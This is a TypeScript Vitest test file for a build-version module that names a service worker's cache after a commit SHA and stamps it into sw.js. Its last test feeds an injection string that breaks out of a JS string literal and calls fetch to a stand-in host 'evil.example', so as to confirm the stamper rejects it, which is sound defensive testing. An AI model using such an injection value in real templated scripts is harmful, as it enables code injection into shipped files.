import { describe, expect, it } from 'vitest';

import {
  BUILD_VERSION_PLACEHOLDER,
  resolveBuildVersion,
  stampBuildVersion,
} from '@/lib/build-version';

/**
 * The build version is the only thing that distinguishes one deploy from another
 * once the files are on the CDN. It names the service worker's cache, so getting
 * it wrong does not produce a cosmetic bug — it produces a cache that never
 * rotates, which is the failure this module exists to prevent.
 *
 * Every probe is injected so these tests never shell out to git and never depend
 * on the state of the checkout they happen to run in.
 */

/** A real-looking 40-character commit SHA. Only its first 8 characters should survive. */
const SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678';

describe('resolveBuildVersion', () => {
  describe('on a CI builder that publishes the commit SHA', () => {
    it("uses Cloudflare Pages' CF_PAGES_COMMIT_SHA", () => {
      expect(resolveBuildVersion({ env: { CF_PAGES_COMMIT_SHA: SHA } })).toBe('a1b2c3d4');
    });

    it('falls back to GITHUB_SHA when Cloudflare is not the builder', () => {
      expect(resolveBuildVersion({ env: { GITHUB_SHA: SHA } })).toBe('a1b2c3d4');
    });

    it('prefers the environment over a local git checkout', () => {
      const version = resolveBuildVersion({
        env: { CF_PAGES_COMMIT_SHA: SHA },
        readHeadSha: () => '00000000000000000000000000000000000000ff',
      });

      expect(version).toBe('a1b2c3d4');
    });

    /**
     * A Pages build is a clean checkout of that commit by construction, so a dirty
     * probe there could only be noise from the build container.
     */
    it('never marks an environment-supplied SHA as dirty', () => {
      const version = resolveBuildVersion({
        env: { CF_PAGES_COMMIT_SHA: SHA },
        readWorkingTreeDirty: () => true,
      });

      expect(version).toBe('a1b2c3d4');
    });

    it('normalises the casing and stray whitespace CI variables sometimes carry', () => {
      expect(
        resolveBuildVersion({ env: { CF_PAGES_COMMIT_SHA: `  ${SHA.toUpperCase()}\n` } })
      ).toBe('a1b2c3d4');
    });

    it('ignores an empty variable rather than producing an empty version', () => {
      const version = resolveBuildVersion({
        env: { CF_PAGES_COMMIT_SHA: '' },
        readHeadSha: () => SHA,
        readWorkingTreeDirty: () => false,
      });

      expect(version).toBe('a1b2c3d4');
    });
  });

  describe('on a machine with git but no CI variables', () => {
    it('uses the short SHA of HEAD', () => {
      const version = resolveBuildVersion({
        env: {},
        readHeadSha: () => SHA,
        readWorkingTreeDirty: () => false,
      });

      expect(version).toBe('a1b2c3d4');
    });

    /**
     * Without this, an uncommitted local build reports the last commit's SHA — which
     * is a lie — and, worse, produces the same version twice in a row, so the service
     * worker's cache stops rotating exactly while you are iterating on it.
     */
    it('marks an uncommitted working tree so the version cannot be mistaken for a commit', () => {
      const version = resolveBuildVersion({
        env: {},
        readHeadSha: () => SHA,
        readWorkingTreeDirty: () => true,
      });

      expect(version).toBe('a1b2c3d4-dirty');
    });
  });

  describe('where git is unavailable', () => {
    /** A source tarball, or a build image without the git binary. It must not fail the build. */
    it('degrades to a timestamp instead of throwing', () => {
      const version = resolveBuildVersion({
        env: {},
        readHeadSha: () => null,
        now: () => 1_756_000_000_000,
      });

      expect(version).toBe('untracked-mep127ls');
    });

    it('cannot be mistaken for a commit SHA', () => {
      const version = resolveBuildVersion({
        env: {},
        readHeadSha: () => null,
        now: () => 1_756_000_000_000,
      });

      expect(version).not.toMatch(/^[0-9a-f]{8}$/);
    });

    /** The whole point of the fallback: two builds must still get two cache names. */
    it('still changes between builds', () => {
      const first = resolveBuildVersion({
        env: {},
        readHeadSha: () => null,
        now: () => 1_756_000_000_000,
      });
      const second = resolveBuildVersion({
        env: {},
        readHeadSha: () => null,
        now: () => 1_756_000_060_000,
      });

      expect(first).not.toBe(second);
    });
  });

  /**
   * The version is interpolated into a JavaScript string literal in sw.js, used as a
   * Cache Storage key and printed into an HTML attribute. Restricting it to lowercase
   * alphanumerics and hyphens keeps all three safe without any escaping.
   */
  describe('the shape every consumer relies on', () => {
    const cases = [
      resolveBuildVersion({ env: { CF_PAGES_COMMIT_SHA: SHA } }),
      resolveBuildVersion({ env: {}, readHeadSha: () => SHA, readWorkingTreeDirty: () => true }),
      resolveBuildVersion({ env: {}, readHeadSha: () => null, now: () => 1_756_000_000_000 }),
    ];

    for (const version of cases) {
      it(`"${version}" is safe in a cache name, a JS string literal and an HTML attribute`, () => {
        expect(version).toMatch(/^[a-z0-9-]+$/);
        expect(version.length).toBeGreaterThan(0);
        expect(version.length).toBeLessThanOrEqual(32);
      });
    }
  });
});

describe('stampBuildVersion', () => {
  it('replaces the placeholder in a copy of the service worker', () => {
    const source = `const BUILD_VERSION = '${BUILD_VERSION_PLACEHOLDER}';`;

    expect(stampBuildVersion(source, 'a1b2c3d4')).toBe("const BUILD_VERSION = 'a1b2c3d4';");
  });

  it('replaces every occurrence, not just the first', () => {
    const source = `${BUILD_VERSION_PLACEHOLDER}|${BUILD_VERSION_PLACEHOLDER}`;

    expect(stampBuildVersion(source, 'a1b2c3d4')).toBe('a1b2c3d4|a1b2c3d4');
  });

  /**
   * The failure this guards against is silent: rename the placeholder in sw.js and the
   * build would happily ship a worker whose cache name never changes again — exactly
   * the bug this whole change removes. Fail the build loudly instead.
   */
  it('refuses to stamp a file that has no placeholder', () => {
    expect(() => stampBuildVersion('const CACHE = "negocio-digital-v1";', 'a1b2c3d4')).toThrow(
      /placeholder/i
    );
  });

  /** The version lands inside a single-quoted JS string, so it must not be able to escape one. */
  it('refuses a version that could break out of the string literal it is written into', () => {
    const source = `const BUILD_VERSION = '${BUILD_VERSION_PLACEHOLDER}';`;

    expect(() => stampBuildVersion(source, "x'; fetch('//evil.example'); //")).toThrow(/version/i);
  });
});
